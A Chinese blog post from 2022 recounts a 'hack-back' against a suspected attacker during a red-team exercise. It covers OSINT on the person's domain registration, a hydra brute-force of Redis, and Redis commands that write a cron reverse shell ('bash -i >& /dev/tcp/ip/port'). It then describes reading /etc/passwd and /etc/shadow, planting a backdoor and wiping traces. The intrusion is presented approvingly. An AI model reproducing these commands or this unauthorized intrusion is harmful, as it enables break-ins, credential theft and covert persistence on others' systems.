@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x001一觉睡醒，打开QQ。发现好兄弟给我发了个消息，看到是一个人名，我就秒懂了，最近正值hvv期间，肯定是哪个hacker被逮住了，要溯源，只给了一个人名、一个别名的qq邮箱，一个域名。  0x002我汇总了一波信息 1、qq邮箱是别名邮箱，无法获取真实qq号 3、有一个.cn的域名，由于.cn后缀域名的特殊性，必须要实名制备案，因此该攻击者真实姓名可知 4、通过域名反查ip可以看到历史ip解">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次溯源反制">
+<meta property="og:url" content="http://example.com/posts/3129367605/index.html">
+<meta property="og:site_name" content="Brich">
+<meta property="og:description" content="0x001一觉睡醒，打开QQ。发现好兄弟给我发了个消息，看到是一个人名，我就秒懂了，最近正值hvv期间，肯定是哪个hacker被逮住了，要溯源，只给了一个人名、一个别名的qq邮箱，一个域名。  0x002我汇总了一波信息 1、qq邮箱是别名邮箱，无法获取真实qq号 3、有一个.cn的域名，由于.cn后缀域名的特殊性，必须要实名制备案，因此该攻击者真实姓名可知 4、通过域名反查ip可以看到历史ip解">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220617175941403.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220617180722054.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220617180934660.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220617181116644.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220617181558870.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220617181804827.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220617181842461.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220617194732858.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220617194923575.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220617182806655.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220617195237791.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220617183211000.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220617183254717.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220617182122570.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220617183817613.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220617184246190.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220617184332300.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220617190051436.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220617190128742.png">
+<meta property="article:published_time" content="2022-06-17T09:55:06.000Z">
+<meta property="article:modified_time" content="2022-06-17T12:02:12.841Z">
+<meta property="article:author" content="1in3r">
+<meta property="article:tag" content="溯源反制">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://typro-1304950244.file.myqcloud.com/image-20220617175941403.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+    
+    <!-- title -->
+    <title>记一次溯源反制</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     --><!--
+       --><li><a href="/gallery/">Photo</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/3298082971/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/posts/3129367605/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/posts/3129367605/&text=记一次溯源反制"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/posts/3129367605/&title=记一次溯源反制"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/posts/3129367605/&is_video=false&description=记一次溯源反制"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=记一次溯源反制&body=Check out this article: http://example.com/posts/3129367605/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/posts/3129367605/&title=记一次溯源反制"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/posts/3129367605/&title=记一次溯源反制"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/posts/3129367605/&title=记一次溯源反制"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/posts/3129367605/&title=记一次溯源反制"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/posts/3129367605/&name=记一次溯源反制&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/posts/3129367605/&t=记一次溯源反制"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x001"><span class="toc-number">1.</span> <span class="toc-text">0x001</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x002"><span class="toc-number">2.</span> <span class="toc-text">0x002</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#icp%E5%A4%87%E6%A1%88%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">icp备案信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nslookup"><span class="toc-number">2.2.</span> <span class="toc-text">nslookup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5"><span class="toc-number">2.3.</span> <span class="toc-text">威胁情报</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x003-Redis-Getshell"><span class="toc-number">3.</span> <span class="toc-text">0x003 Redis Getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x004-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.</span> <span class="toc-text">0x004 信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">5.</span> <span class="toc-text">0x05 权限维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E4%BA%BA%E7%89%A9%E7%94%BB%E5%83%8F"><span class="toc-number">6.</span> <span class="toc-text">0x06 人物画像</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        记一次溯源反制
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">1in3r</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-06-17T09:55:06.000Z" itemprop="datePublished">2022-06-17</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/" rel="tag">溯源反制</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x001"><a href="#0x001" class="headerlink" title="0x001"></a>0x001</h2><p>一觉睡醒，打开QQ。发现好兄弟给我发了个消息，看到是一个人名，我就秒懂了，最近正值hvv期间，肯定是哪个hacker被逮住了，要溯源，只给了一个人名、一个别名的qq邮箱，一个域名。</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220617175941403.png" alt="image-20220617175941403"></p>
+<h2 id="0x002"><a href="#0x002" class="headerlink" title="0x002"></a>0x002</h2><p>我汇总了一波信息</p>
+<p>1、qq邮箱是别名邮箱，无法获取真实qq号</p>
+<p>3、有一个.cn的域名，由于.cn后缀域名的特殊性，必须要实名制备案，因此该攻击者真实姓名可知</p>
+<p>4、通过域名反查ip可以看到历史ip解析记录，获得ip—1xx.2xx.7x.xx</p>
+<p>5、已经掌握的域名<a target="_blank" rel="noopener" href="http://www.xxx.cn目前已无法正常访问,无有效子域名/">www.xxx.cn目前已无法正常访问，无有效子域名</a></p>
+<h3 id="icp备案信息"><a href="#icp备案信息" class="headerlink" title="icp备案信息"></a>icp备案信息</h3><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220617180722054.png" alt="image-20220617180722054"></p>
+<h3 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h3><p>得到域名解析的ip、ip归属为上海腾讯云</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220617180934660.png" alt="image-20220617180934660"></p>
+<h3 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h3><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220617181116644.png" alt="image-20220617181116644"></p>
+<p>由于qq号这个方向无法突破，不然就可以直接查到手机号，直接溯源到本人，sgk也没有相关可用的信息，目标域名对应的服务也已经下架了，那么我考虑对其服务器进行反制</p>
+<h2 id="0x003-Redis-Getshell"><a href="#0x003-Redis-Getshell" class="headerlink" title="0x003 Redis Getshell"></a>0x003 Redis Getshell</h2><p>当我使用空间搜索引擎查询这个ip时，发现有redis服务和RabbitMQ服务</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220617181558870.png" alt="image-20220617181558870"></p>
+<p>RabbitMQ guest&#x2F;guest可登录，但是搜索了一下历史漏洞，无可用漏洞，作罢</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220617181804827.png" alt="image-20220617181804827"></p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220617181842461.png"></p>
+<p>接下来看看redis服务，会不会有意外的收获，直接连接，提示未认证，我还以为运气好未授权redis直接拿下呢，没想到竟然设置了认证。</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220617194732858.png" alt="image-20220617194732858"></p>
+<p>hydra爆破一下redis服务的密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -P  ./passwords-100000.txt 124.xxx.xx.xx redis 6380</span><br></pre></td></tr></table></figure>
+
+<p>密码是root，这….让我怀疑是蜜罐</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220617194923575.png" alt="image-20220617194923575"></p>
+<p>再次连接redis服务-a参数指定密码</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220617182806655.png" alt="image-20220617182806655"></p>
+<p>看了下6380这台redis是从redis，主redis在6379端口上，从redis只有read权限，没有write权限，因此我们要切换到主redis进行后续操作，一台服务器那么多redis不会是docker吧？那还得docker逃逸….</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220617195237791.png" alt="image-20220617195237791"></p>
+<p>不出意外的出意外6379端口的redis认证密码也是root</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220617183211000.png" alt="image-20220617183211000"></p>
+<p>可以看到主redis和从redis信息</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220617183254717.png" alt="image-20220617183254717"></p>
+<p>那么直接redis写Linux计划任务getshell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">124.xxx.xx.xx:6379&gt; config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/</span><br><span class="line">OK</span><br><span class="line">124.xxx.xx.xx:6379&gt; <span class="built_in">set</span>  xx   <span class="string">&quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\n&quot;</span></span><br><span class="line">OK</span><br><span class="line">124.xxx.xx.xx:6379&gt; config <span class="built_in">set</span> dbfilename root</span><br><span class="line">OK</span><br><span class="line">124.xxx.xx.xx:6379&gt; save</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220617182122570.png" alt="image-20220617182122570"></p>
+<p>反弹shell成功，成功反制</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220617183817613.png" alt="image-20220617183817613"></p>
+<h2 id="0x004-信息收集"><a href="#0x004-信息收集" class="headerlink" title="0x004 信息收集"></a>0x004 信息收集</h2><p>应该不是蜜罐，有docker服务</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220617184246190.png" alt="image-20220617184246190"></p>
+<p>出口ip一致</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220617184332300.png" alt="image-20220617184332300"></p>
+<p>&#x2F;etc&#x2F;passwd</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220617190051436.png" alt="image-20220617190051436"></p>
+<p>&#x2F;etc&#x2F;shadow</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220617190128742.png" alt="image-20220617190128742"></p>
+<h2 id="0x05-权限维持"><a href="#0x05-权限维持" class="headerlink" title="0x05 权限维持"></a>0x05 权限维持</h2><p>我留了个后门，清理了一下redis添加的key和linux计划任务还有bash历史命令，主要怕被二次反制</p>
+<h2 id="0x06-人物画像"><a href="#0x06-人物画像" class="headerlink" title="0x06 人物画像"></a>0x06 人物画像</h2><p>我个人感觉，这个人应该技术水平比较一般，行为也只是扫描，起初我看到不同端口的redis，我以为是他用docker开的，当我拿下服务器权限之后发现其并不是使用docker启动的redis服务，而且redis使用的是弱密码进行认证，这才导致了他服务器的沦陷，通过docker ps -a命令我发现他拉了nginx、mysql服务，但是关闭了，应该也是怕溯源然后被拿下，所以使用docker开的web服务。最后还是没有获取到他的个人信息，无法精准溯源到个人，不过服务器已经拿下了，也留了点东西，看他会不会上当。</p>
+
+  </div>
+</article>
+
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/vlog/">vlog</a></li>
+         
+          <li><a href="/gallery/">Photo</a></li>
+         
+          <li><a href="/friends/">Friends</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x001"><span class="toc-number">1.</span> <span class="toc-text">0x001</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x002"><span class="toc-number">2.</span> <span class="toc-text">0x002</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#icp%E5%A4%87%E6%A1%88%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">icp备案信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nslookup"><span class="toc-number">2.2.</span> <span class="toc-text">nslookup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5"><span class="toc-number">2.3.</span> <span class="toc-text">威胁情报</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x003-Redis-Getshell"><span class="toc-number">3.</span> <span class="toc-text">0x003 Redis Getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x004-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.</span> <span class="toc-text">0x004 信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">5.</span> <span class="toc-text">0x05 权限维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E4%BA%BA%E7%89%A9%E7%94%BB%E5%83%8F"><span class="toc-number">6.</span> <span class="toc-text">0x06 人物画像</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/posts/3129367605/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/posts/3129367605/&text=记一次溯源反制"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/posts/3129367605/&title=记一次溯源反制"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/posts/3129367605/&is_video=false&description=记一次溯源反制"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=记一次溯源反制&body=Check out this article: http://example.com/posts/3129367605/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/posts/3129367605/&title=记一次溯源反制"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/posts/3129367605/&title=记一次溯源反制"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/posts/3129367605/&title=记一次溯源反制"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/posts/3129367605/&title=记一次溯源反制"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/posts/3129367605/&name=记一次溯源反制&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/posts/3129367605/&t=记一次溯源反制"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    1in3r
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     --><!--
+       --><li><a href="/gallery/">Photo</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments" class="blog-post-comments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            visitor: true,
+            appId: 'Ku71Pva4EFeKIH5y64LCYVwp-gzGzoHsz',
+            appKey: 'wqnsWKV8eVHemIwCa9vo9vRg',
+            placeholder: '快来评论一下吧',
+            avatar: 'robohash'
+        })
+    </script>
+
+    
+<!-- utterances Comments -->
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"superSample":2,"width":200,"height":350,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":false,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
